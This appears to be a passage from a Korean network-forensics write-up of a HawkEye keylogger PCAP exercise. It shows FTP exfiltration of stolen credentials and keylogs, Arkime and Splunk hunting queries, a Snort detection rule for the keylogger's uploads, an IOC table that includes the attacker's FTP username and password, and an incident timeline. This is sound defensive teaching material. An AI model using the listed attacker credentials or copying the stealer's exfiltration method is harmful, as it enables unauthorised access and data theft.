### 4-2. Stealer Records의 내용 { #stealer-records }

`port.dst == 37280` 세션을 펼쳐요. 파일이 평문으로 전송됐어요(여기서는 비밀번호를 지웠어요):

```text
==============================================
Operating System Intel Recovery
==============================================
PC Name: BREAUX-WIN7-PC
Local Time: 5/2/2019 9:36:23 PM
Installed Language: en-US
Net Version: 2.0.50727.5420
Operating System: Microsoft Windows 7 Enterprise
Internal IP Address: 10.0.0.227
External IP Address:
==============================================
WEB Browser Password Stealer
==============================================
URL : https://accounts.google.com/signin/v2/sl/pwd
Web Browser : Chrome
User Name : adriana.breaux@gmail.com
Password : ********
---
URL : https://www.bbt.com/
Web Browser : Internet Explorer 7.0 - 9.0
User Name : adriana.breaux
Password : ********
==============================================
Mail Messenger Password Stealer
==============================================
Application : MS Outlook 2002/2003/2007/2010
Email : adriana.breaux@gmail.com
Server : pop.gmail.com   Server Port : 995   Type : POP3
SMTP Server : smtp.gmail.com   SMTP Server Port : 587
User : adriana.breaux
Password : ********
==============================================
Internet Download Manager Stealer
JDownloader Password Stealer
==============================================
```

**결과 읽기:**

- 맨 위 "Operating System Intel Recovery" 부분은 HawkEye 보고서의 기본 머리말이에요. PC 이름, OS, 내부 IP 같은 호스트 정보가 들어 있어요.
- **털린 계정은 3개예요.** Chrome에 저장된 Gmail, IE에 저장된 **BB&T 온라인뱅킹**, Outlook POP3 메일이에요.
- **세 계정의 비밀번호가 모두 같아요.** 한 계정이 털리면 나머지도 다 열려요. 모든 계정의 비밀번호를 바꿔야 해요.
- **`External IP Address:` 칸이 비어 있어요.** 21:36:14 whatismyipaddress 요청의 응답이 564 B밖에 안 됐던 걸 보면, 공인 IP 확인이 실패한 것으로 보여요. 티켓에 넣을 만큼 중요하지는 않아요.

!!! note "피해자 비밀번호는 티켓에 적지 않아요"
    티켓은 여러 사람이 보는 문서예요. 값 대신 "세 계정 같은 비밀번호 — 증거 PCAP 참고"라고 써요. 공격자의 FTP 비밀번호는 다르게 IOC로 남겨요.

### 4-3. 키로그의 내용 { #keylogs }

`40651`(Keylog_Records_2)과 `36091`(Keylog_Records_3) 세션을 펼쳐요.

```text
Keylog_Records_2 (891 B)
[Microsoft Excel - Book1 - 5/2/2019 9:39:22 PM]
Date Ban[BS][BS][BS][BS]Name Amount [V][<][<][<]2019-05-01 Roger Simmons 541.03 ...
Sharon Tate 100 ... Geddy Basher 25.16 ... Fred Rogers 0.10
[Save As - 5/2/2019 9:40:39 PM]
Accounts-payable

Keylog_Records_3 (601 B)
[Document1 - Microsoft Word - 5/2/2019 10:01:15 PM]
I t[BS][BS]t was a dark and story[BS]my night. ...
```

- 블록마다 **창 제목과 시간**이 먼저 나오고, 그다음에 친 키가 나와요. `[BS]`는 Backspace, `[V][<]`는 특수키와 방향키예요.
- Keylog 2에는 사용자가 Excel에 **지급 데이터(날짜, 이름, 금액)**를 입력하고 **"Accounts-payable"**(외상매입금) 이름으로 저장한 기록이 있어요. 비밀번호만이 아니라 회사 재무 데이터까지 새어 나간 거예요.

**2~4단계 요약:** Breaux-Win7-PC의 HawkEye가 비밀번호 보고서, 키 입력, 스크린샷을 공격자의 000webhost FTP 계정으로 10~15분마다 보냈어요.

### 4-4. 초기 침투 { #initial-access }

21:36 전에는 도메인 로그인과 윈도우 인터넷 연결 확인만 있어요. 이메일, 웹 다운로드, 인터넷에서 받은 파일이 없어요. 악성코드는 **이미 PC에 있었고** 로그인 뒤에 실행된 거예요. 티켓에는 "Initial access not in capture"로 써요. 호스트 확인: Run 키, 예약 작업, 이메일 첨부파일.

!!! question "질문: Arkime 명령어를 태그를 붙여서 다시 주세요"
    pcapbox에서는 앞에 `tags == <케이스> &&`를 붙여서 이 케이스 세션만 검색해요.

    ```text
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 21
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 37280
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && ip.dst == 145.14.145.4 && port.dst == 21
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && http.host == whatismyipaddress.com
    ```

    티켓에는 **태그 없는** 버전을 그대로 둬요. `tags`는 pcapbox에서 케이스를 나누려고 붙인 것이라 팀 환경에는 없어요.

!!! question "질문: `HawkEye_Keylogger`를 Arkime에서 검색하려면?"
    Sessions 검색창에서는 바로 찾을 수 없어요. Arkime은 FTP 명령 안의 파일 이름을 필드로 저장하지 않거든요. **패킷 내용 속 글자**를 찾을 때는 **Hunt**를 써요.

    1. 먼저 **Sessions** 검색창에 범위를 넣어요: `tags == 20190502_BEGUILESOFT && port.dst == 21`. Hunt는 지금 검색 결과의 세션만 뒤져서, 범위를 좁힐수록 빨라요.
    2. 위 메뉴 **Hunt** → **Create a packet search job**.
    3. 칸 채우기: **Name** `hawkeye_ftp` · **Search** `HawkEye_Keylogger` · **Search type** `ascii (case insensitive)` (Snort의 `nocase`와 같아요) · **Src/Dst** `Src`만 체크(STOR는 PC가 보내니까) · **Max packets per session** 기본값.
    4. **Create**를 누르면 작업이 돌고, 끝나면 매칭된 세션 수가 나와요. 여기서는 **3개**예요(제어 세션 3개 모두에 HawkEye_Keylogger STOR가 있으니까요).
    5. 결과는 Sessions에서 `huntName == hawkeye_ftp`로 다시 볼 수 있어요. 매칭된 세션에 hunt 이름이 붙어서 필드처럼 검색돼요.

    **빠른 대안:** Arkime은 FTP 로그인 계정은 **Users** 필드로 저장해요. 그래서 이건 검색창에서 바로 돼요.

    ```text
    tags == 20190502_BEGUILESOFT && user == snifferzett
    ```

    정리하면, **패킷 안의 아무 글자 → Hunt**, **Arkime이 필드로 뽑아 둔 값**(IP, 포트, 도메인, user 등) → 검색창이에요. Hunt는 여러 세션에 문자열 찾기를 한꺼번에 돌린다고 생각하면 돼요.

---

## 5단계 — Snort 룰 하나 { #snort }

`depth`나 `distance` 없이 가장 쉬운 버전이에요.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:"HawkEye Keylogger FTP upload - Sung"; content:"HawkEye_Keylogger"; nocase; sid:1000021; rev:1;)
```

**괄호 앞(헤더)** — 어떤 패킷을 볼지:

- `alert`는 조건에 맞으면 알림을 낸다는 뜻이에요.
- `tcp`는 TCP 패킷만 봐요.
- `$HOME_NET any`는 출발지가 내부망이고, 출발지 포트는 아무거나예요.
- `->`는 방향이에요. 내부에서 밖으로 나가는 패킷이에요.
- `$EXTERNAL_NET 21`은 목적지가 외부이고 포트 21(FTP 명령 포트)이라는 뜻이에요.

**괄호 안(옵션)** — 패킷 안에서 무엇을 찾을지:

- `msg`는 알림이 뜰 때 보이는 이름이에요.
- `content:"HawkEye_Keylogger"`는 패킷 내용에 이 글자가 있는지 찾아요.
- `nocase`는 대소문자를 구분하지 않아요. `hawkeye_keylogger`도 잡혀요.
- `sid`는 룰 번호예요. 직접 만든 룰은 1000000 이상을 써요.
- `rev`는 룰 버전이에요.

!!! question "질문: depth나 distance 없이 룰을 쓸 수 있나요?"
    네, 위 룰이에요. `depth`와 `distance`는 "글자가 패킷의 **어디쯤**에 있는지"를 지정해서 오탐을 줄이고 속도를 높여요. 하지만 `HawkEye_Keylogger`라는 글자 자체가 아주 특이해서, 정상 FTP 트래픽에서 나올 일이 거의 없어요. 그래서 위치를 지정하지 않아도 충분해요. `STOR ` 조건을 뺀 것도 같은 이유예요. 포트 21로 이 파일 이름이 나가는 경우는 사실상 업로드뿐이에요. `flow`와 `classtype`도 뺐어요. 방향은 헤더의 `->`와 포트 21이 이미 정해 주니까요.

**예상 결과:** `\\10.50.10.60\rules\local.rules`에 넣고 `snort-test 20190502_BEGUILESOFT`를 돌리면 **알림 3건**이에요. HawkEye_Keylogger가 들어간 STOR가 3번이었거든요(Stealer_Records, Keylog_Records_2, Keylog_Records_3). 스크린샷 STOR 2번은 파일 이름에 그 글자가 없어서 안 잡혀요. 자세한 테스트 방법은 [Night Dew 두 번째 분석 — 6-3](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test)에 있어요.

---

## 타임라인 (2019-05-02, UTC) { #timeline }

| 시간 | 일 |
|---|---|
| 21:35:18 | 캡처 시작. DC 10.0.0.10으로 도메인 로그인 트래픽(DNS, Kerberos, LDAP, SMB) |
| 21:35:21 | DHCP INFORM: Breaux-Win7-PC, beguilesoft.com |
| 21:35:26 | 윈도우 인터넷 연결 확인(`www.msftncsi[.]com`) — 정상 |
| 21:36:14 | 공인 IP 조회 `whatismyipaddress[.]com` (104.16.154.36) |
| 21:36:33–21:36:35 | 145.14.145.4에 FTP 로그인 `snifferzett`, **Stealer Records**(2,791 B) 업로드 |
| 21:46:27–21:46:33 | 145.14.144.10에 FTP, **Keylog_Records_2**(891 B) + **screenshot1**(2.8 MB) 업로드 |
| 22:01:33–22:01:38 | 145.14.145.99에 FTP, **Keylog_Records_3**(601 B) + **screenshot2**(2.2 MB) 업로드 |
| 22:05:23 | 캡처 끝 |

## IOC { #iocs }

| 종류 | 값 | 설명 |
|---|---|---|
| 도메인 | `files.000webhost[.]com` | FTP 유출 목적지(무료 호스팅) |
| IP | 145.14.145.4, 145.14.144.10, 145.14.145.99 | 000webhost FTP 서버 |
| FTP 계정 | `snifferzett` / `trible22` | 공격자 계정 |
| 파일 이름 패턴 | `HawkEye_Keylogger_Stealer_Records_<HOST> <날짜>.txt`, `HawkEye_Keylogger_Keylog_Records_<n>_<HOST> <날짜>.txt`, `screenshot<n>_<HOST>.jpeg` | HawkEye 업로드 이름 |
| 도메인 | `whatismyipaddress[.]com` | 정상 서비스, 공인 IP 확인에 쓰임 |

---

## 침해사고 티켓 { #ticket }

핵심만, 짧은 문장, 쉬운 영어로 썼어요. 오퍼레이터 이름과 로그 시간은 바꿔 쓸 자리예요.

[:material-download: 티켓을 txt 파일로 내려받기](files/190502_BREAUX-WIN7-PC_ticket.txt){ .md-button }

```text
--8<-- "docs-ko/blueteam/investigations/files/190502_BREAUX-WIN7-PC_ticket.txt"
```

!!! question "질문: 티켓 문장을 더 줄일 수 있나요?"
    두 번째로 다듬으면서 줄였어요. DESCRIPTION 세 문단을 두 문단으로 줄였고(공인 IP 조회는 EXTERNAL MACHINES 칸에 이미 있어서 뺐어요), Arkime 관련 OPERATOR LOG 두 줄을 한 줄로 합쳤어요. ANALYST NOTES는 비슷한 내용끼리 묶었어요(로그인 + STOR 5줄 + "모두 226", 그리고 털린 계정 + 키로그). 포트 설명과 쿼리 라벨도 짧게 했어요. 사고를 증명하는 내용은 하나도 빼지 않았어요.

---

## 바로 쓰는 쿼리 모음 { #query-sheet }

`<case>`를 케이스 이름으로 바꾸세요. 실제 망에서는 `pcap_case`/`tags`를 빼요.

**Splunk (Zeek)**

```spl
index=zeek pcap_case="<case>" | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
index=zeek sourcetype=zeek:dhcp pcap_case="<case>" | eval time=strftime(ts, "%Y-%m-%d %H:%M:%S") | table time client_addr assigned_addr mac host_name domain msg_types
index=zeek sourcetype=zeek:conn pcap_case="<case>" | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
index=zeek sourcetype=zeek:kerberos pcap_case="<case>" | stats count BY id_orig_h id_resp_h client
index=zeek sourcetype=zeek:conn pcap_case="<case>" | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dns pcap_case="<case>" | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:ftp pcap_case="<case>" | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h user command arg reply_code reply_msg
index=zeek sourcetype=zeek:ftp id_orig_h=10.0.0.227 command=STOR
index=zeek sourcetype=zeek:conn id_orig_h=10.0.0.227 id_resp_h IN (145.14.145.4, 145.14.144.10, 145.14.145.99)
```

- `command=STOR`는 FTP 명령 중 업로드만 골라요. `id_resp_h IN (a, b, c)`는 목적지 IP가 셋 중 하나면 다 잡아요. `OR`를 세 번 쓰는 것과 같아요.

**Arkime**

```text
tags == <case> && ip.src == 10.0.0.227 && port.dst == 21
tags == <case> && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
tags == <case> && ip.src == 10.0.0.227 && port.dst == 37280
tags == <case> && user == snifferzett
huntName == hawkeye_ftp
```

**Snort**

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:"HawkEye Keylogger FTP upload - Sung"; content:"HawkEye_Keylogger"; nocase; sid:1000021; rev:1;)
```

---

## 배운 점 { #lessons }

1. **로그 종류 목록이 이미 단서예요.** TLS가 하나도 없는 사무실 PC에 FTP가 있다는 것만으로 유출 경로가 보였어요.
2. **DHCP INFORM에는 배정 주소가 없어요.** IP는 `conn`에서, 이름과 MAC은 DHCP에서 가져와요.
3. **보낸 양과 받은 양이 방향을 알려 줘요.** 보낸 게 MB 단위이고 받은 게 0인 `ftp-data` = 업로드.
4. **PASV 계산으로 파일과 크기를 이어요.** p1 × 256 + p2 = `ftp-data` 포트.
5. **Zeek은 명령에 마지막 응답을 붙여요.** 업로드 실패라고 하기 전에 원본 세션을 봐요.
6. **평문 프로토콜은 증거를 그대로 줘요.** FTP에서 공격자 계정과 훔친 파일 전부가 보였어요.
7. **악성코드 이름은 조심해서 붙여요.** "HawkEye"는 악성코드가 스스로 쓴 파일 이름에서 나온 거라 강한 근거지만, 샘플 분석은 아니에요.
8. **피해자 비밀번호는 티켓에 적지 않아요.** "증거 참고"라고 써요.

## 참고 { #references }

- [Night Dew 두 번째 분석 — pcapbox 설정과 Snort 테스트 가이드](night-dew-arkime-splunk-netlogon-bruteforce.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Zeek 로그](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md)
- [플레이북: 데이터 유출](../playbooks/data-exfiltration.md) · [플레이북: 계정 침해](../playbooks/account-compromise.md)
- 원본 연습 문제: [malware-traffic-analysis.net — 2019-05-02 BEGUILESOFT](https://malware-traffic-analysis.net/2019/05/02/index.html)
